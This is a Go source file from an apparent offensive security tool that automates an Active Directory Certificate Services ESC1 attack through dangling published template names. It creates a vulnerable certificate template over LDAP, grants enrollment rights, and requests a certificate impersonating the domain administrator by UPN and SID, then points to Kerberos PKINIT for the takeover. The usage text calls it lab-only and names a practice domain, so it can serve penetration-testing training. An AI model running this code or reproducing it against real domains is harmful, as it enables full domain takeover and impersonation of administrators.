package preimplant

import (
	"fmt"
	"os"

	"github.com/KKingZero/ARK/pkg/adcs"
	"github.com/KKingZero/ARK/pkg/ldapcli"
)

const adcsUsage = `ark adcs — dangling-name ESC1 (host LDAP + WCCE, no Certipy)

  ark adcs dangling --dc H --domain D --user U --pass-file P
  ark adcs template create --dc H --domain D --user U --pass-file P --name VPNUserTemplate --yes
  ark adcs template grant  --dc H --domain D --user U --pass-file P --name VPNUserTemplate --trustee jake.h --yes
  ark adcs template delete --dc H --domain D --user U --pass-file P --name VPNUserTemplate --yes
  ark adcs req --dc H --domain D --user U --pass-file P --ca danglingtree-CA \
      --template VPNUserTemplate --upn administrator@danglingtree.htb \
      --sid S-1-5-21-…-500 --out admin.pfx --yes
  ark adcs auto --dc H --domain D --user U --pass-file P --name VPNUserTemplate \
      --ca danglingtree-CA --upn administrator@danglingtree.htb \
      --sid S-1-5-21-…-500 --out admin.pfx --yes

Schema-v1 ESC1 only (enrollee supplies subject + Client Auth). Does not copy User SD.
Cleanup: template delete. Then: ark kerberos pkinit --pfx admin.pfx ...
Lab-only. Critical writes require --yes.
`

// RunADCS is host-side ADCS dangling ESC1.
func RunADCS(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("%s", adcsUsage)
	}
	switch args[0] {
	case "help", "-h", "--help":
		fmt.Print(adcsUsage)
		return nil
	case "dangling":
		return ldapDangling(args[1:])
	case "template":
		return adcsTemplate(args[1:])
	case "req", "request":
		return adcsReq(args[1:])
	case "auto":
		return adcsAuto(args[1:])
	default:
		return fmt.Errorf("unknown adcs command %q\n%s", args[0], adcsUsage)
	}
}

func adcsTemplate(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: adcs template create|grant|delete ...")
	}
	cmd := args[0]
	f, _ := ParseFlags(args[1:])
	opts, err := ldapOpts(f)
	if err != nil {
		return err
	}
	name := first(f, "name", "template")
	if name == "" {
		return fmt.Errorf("--name required")
	}
	if !flagBool(f, "yes") {
		return fmt.Errorf("refusing ADCS template %s without --yes", cmd)
	}
	printProxyHint()
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return err
	}
	defer conn.Close()
	switch cmd {
	case "create":
		dn, err := ldapcli.CreateESC1Template(conn, name)
		if err != nil {
			return err
		}
		fmt.Printf("OK template create %s (schema v1 ESC1, no User SD)\n", dn)
		fmt.Println("next: ark adcs template grant --name", name, "--trustee", opts.Username, "--yes")
		return nil
	case "grant":
		trustee := first(f, "trustee", "sam")
		if trustee == "" {
			trustee = opts.Username
		}
		base := ldapcli.BaseDN(opts.Domain)
		if err := ldapcli.GrantTemplateEnroll(conn, base, name, trustee); err != nil {
			return err
		}
		fmt.Printf("OK template grant enroll trustee=%s name=%s\n", trustee, name)
		return nil
	case "delete":
		if err := ldapcli.DeleteTemplate(conn, name); err != nil {
			return err
		}
		fmt.Printf("OK template delete %s\n", name)
		return nil
	default:
		return fmt.Errorf("unknown template command %q", cmd)
	}
}

func adcsReq(args []string) error {
	f, _ := ParseFlags(args)
	if !flagBool(f, "yes") {
		return fmt.Errorf("refusing WCCE request without --yes")
	}
	upn := first(f, "upn")
	sid := first(f, "sid")
	tpl := first(f, "template", "name")
	ca := first(f, "ca")
	out := first(f, "out", "pfx")
	if upn == "" || sid == "" || tpl == "" || ca == "" || out == "" {
		return fmt.Errorf("--upn --sid --template --ca --out required")
	}
	csr, err := adcs.NewESC1CSR(adcs.CSROptions{UPN: upn, SID: sid, Template: tpl})
	if err != nil {
		return err
	}
	opts, err := ldapOpts(f)
	if err != nil {
		return err
	}
	printProxyHint()
	cert, err := adcs.RequestCert(adcs.RequestOptions{
		Host:     opts.Host,
		CA:       ca,
		Template: tpl,
		CSR:      csr.DER,
		Domain:   opts.Domain,
		Username: opts.Username,
		Password: opts.Password,
		Hash:     opts.Hash,
		Ticket:   first(f, "ticket"),
	})
	if err != nil {
		return err
	}
	pfx, err := adcs.PackPFX(csr.Key, cert)
	if err != nil {
		return err
	}
	if err := os.WriteFile(out, pfx, 0o600); err != nil {
		return err
	}
	fmt.Printf("OK adcs req pfx=%s ca=%s template=%s upn=%s\n", out, ca, tpl, upn)
	fmt.Println("next: ark kerberos pkinit --pfx", out, "--dc", opts.Host, "--domain", opts.Domain, "--user", upnUser(upn))
	return nil
}

func adcsAuto(args []string) error {
	f, _ := ParseFlags(args)
	if !flagBool(f, "yes") {
		return fmt.Errorf("refusing adcs auto without --yes")
	}
	name := first(f, "name", "template")
	if name == "" {
		return fmt.Errorf("--name required")
	}
	opts, err := ldapOpts(f)
	if err != nil {
		return err
	}
	printProxyHint()
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return err
	}
	defer conn.Close()
	dangle, err := ldapcli.DanglingTemplates(conn)
	if err != nil {
		return err
	}
	found := false
	for _, n := range dangle.Missing {
		if n == name {
			found = true
			break
		}
	}
	if !found {
		fmt.Printf("warn: %s is not in dangling published list (create anyway)\n", name)
	}
	if _, err := ldapcli.GetTemplate(conn, name); err != nil {
		dn, err := ldapcli.CreateESC1Template(conn, name)
		if err != nil {
			return err
		}
		fmt.Printf("OK template create %s\n", dn)
	} else {
		fmt.Printf("template %s already exists\n", name)
	}
	trustee := first(f, "trustee", "sam")
	if trustee == "" {
		trustee = opts.Username
	}
	if err := ldapcli.GrantTemplateEnroll(conn, ldapcli.BaseDN(opts.Domain), name, trustee); err != nil {
		return err
	}
	fmt.Printf("OK template grant trustee=%s\n", trustee)
	return adcsReq(args)
}

func upnUser(upn string) string {
	if i := len(upn); i > 0 {
		for j, c := range upn {
			if c == '@' {
				return upn[:j]
			}
		}
	}
	return upn
}
